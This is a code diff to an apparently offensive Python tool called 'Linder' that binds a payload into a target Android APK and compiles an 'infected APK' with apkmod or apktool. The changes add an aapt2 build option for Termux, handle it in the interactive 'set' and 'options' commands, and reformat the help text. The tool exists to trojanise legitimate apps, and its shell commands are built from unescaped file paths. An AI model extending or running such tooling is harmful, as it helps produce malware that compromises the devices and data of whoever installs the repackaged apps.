@@ -31,6 +31,7 @@ global package, package_name, package_name_path, smali_loc, smali_path,P1
 payload_input = 'Not set'
 original_input = 'Not set'
 final_path = 'Not set'
+aapt2=False
 interactive=False
 
 def Termux_Bool():
@@ -341,8 +342,12 @@ def Bind():
 		print_status('Compiling Infected APK...\n')
 
 		if Termux_Bool():
-			subprocess.call("apkmod -a -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
-			os.chdir('../')
+			if aapt2:
+				subprocess.call("apkmod -a -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
+				os.chdir('../')
+			else:
+				subprocess.call("apkmod -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
+				os.chdir('../')
 		else:
 			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(final_path)),shell=True)
 			subprocess.call(mv + ' '+ str(final_path) + ' ..',shell=True)
@@ -408,7 +413,7 @@ class Interactive:
 		pass
 
 	def SetCMD(self,option,value):
-		global payload_input,original_input,final_path
+		global payload_input,original_input,final_path,aapt2
 		if option.lower() == 'payload':
 			if os.path.isfile(value):
 				payload_input = value
@@ -423,31 +428,30 @@ class Interactive:
 				err_msg("Invalid path. '%s': does not exists." % (value))
 		elif option.lower() == 'output':
 			pathcheck(value,'interactive')
+		elif Termux_Bool() and option.lower() == 'aapt2':
+			if value.lower() == 'true':
+				aapt2 = True
+				print('aapt2 ==> True')
+			elif value.lower() == 'false':
+				aapt2 = False
+				print('aapt2 ==> False')
+			else:
+				err_msg('invalid value selected.')
+				print('available values: True, False')
 
 		else:
 			err_msg("Invalid option selected")
 			print('Allowed Options Are: payload , target, output')
 	def usage(self):
-		print('''
-
-----LIST OF COMMANDS-----
-
-----COMMAND     	ACTION-------
-
-[+] set 		set options [set <option> <value>]
-
-[+] options		show values for all options
-
-[+] bind 		start binding
-
-[+] clear		clear the screen
-
-[+] update 		update the script
-
-[+] help        show this help message
-
-[+] exit		Does what it says...
-''')
+		print('----LIST OF COMMANDS----\n')
+		print('----COMMAND 		ACTION----\n')
+		print('[+] set  		set options [set <option> <value>]\n')
+		print('[+] options 		show available options and their values\n')
+		print('[+] bind 		start binding\n')
+		print('[+] clear		clear the screen.\n')
+		print('[+] update 		update the script\n')
+		print('[+] help  		show this help message\n')
+		print('[+] exit 		does what it says.\n')
 
 	def clear(self):
 		if os.name == 'nt':
@@ -457,7 +461,7 @@ class Interactive:
 
 
 	def Start(self):
-		global payload_input,original_input,final_path
+		global payload_input,original_input,final_path,aapt2
 		print_status("\nStarted Interactive mode. Type 'help' for list of available commands.\n")
 		while True:
 			void = input(YELLOW + "Linder>> " + WHITE).strip().split(' ')
@@ -481,6 +485,8 @@ class Interactive:
 				else:
 					err_msg('Please turn ON your data connection')
 			elif void[0].lower() == 'options':
+				if Termux_Bool():
+					print('aapt2 => '+str(aapt2))
 				print('Payload => '+payload_input)
 				print('Target => ' +original_input)
 				print('Output => '+final_path)
